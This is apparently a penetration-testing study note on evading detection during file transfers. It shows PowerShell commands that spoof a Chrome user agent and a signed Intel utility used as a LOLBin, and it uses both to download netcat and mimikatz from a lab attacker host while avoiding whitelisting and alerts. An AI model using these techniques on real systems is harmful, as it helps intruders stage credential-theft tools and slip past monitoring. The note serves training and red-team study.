
Good attackers **hide**, but great attackers **blend in**.  
If your file transfers are getting flagged, use stealth techniques to avoid detection.

---

## **1. Modify User-Agent Strings**

Defenders often monitor traffic for suspicious user agents such as:

- `curl/7.68.0`
    
- `PowerShell/5.1.14393`
    
- `Microsoft BITS/7.8`
    

Customizing your user agent helps you blend in with normal traffic.

### **List Built-In PowerShell User Agents**

Run:

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | 
Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**Examples you’ll see:**

- Chrome: `Mozilla/5.0 ... Chrome/7.0.500.0`
    
- Firefox: `Gecko/20100401 Firefox/4.0`
    
- Safari: `AppleWebKit/533.16`
    

---

### **Use a Fake Chrome User-Agent**

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

**Server Log Example:**

```
User-Agent: Mozilla/5.0 ... Chrome/7.0.500.0 Safari/534.6
```

This looks **far less suspicious** than `WindowsPowerShell/5.1`.

---

## **2. Living Off the Land (LOLBins & GTFOBins)**

When PowerShell, Netcat, or external tools are blocked, rely on **trusted system binaries**:

- Already **pre-installed**
    
- **Vendor-signed**
    
- **Whitelisted** by security solutions
    

---

### **Example: `GfxDownloadWrapper.exe`**

A legitimate Intel driver utility that can download files:

```cmd
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

**Advantages:**

- Likely to bypass application whitelisting
    
- May not trigger logging or alerts
    

**Limitations:**

- Only available on systems with Intel drivers installed.
    

---

## **3. Useful Resources**

- [LOLBAS Project](https://lolbas-project.github.io/) — Windows binaries for living-off-the-land techniques.
    
- [GTFOBins Project](https://gtfobins.github.io/) — Linux/Unix binaries for similar purposes.
    

**Pro Tip:**  
Use `+file-download` or `+file-upload` filters on those sites to quickly find tools for file transfers.

---

## **Summary**

- Change your **user agent** to mimic normal browsers or system tools.
    
- Use **trusted binaries (LOLBins/GTFOBins)** for stealthy file transfers.
    
- Research your target environment and leverage what's already there for **low-noise operations**.
    
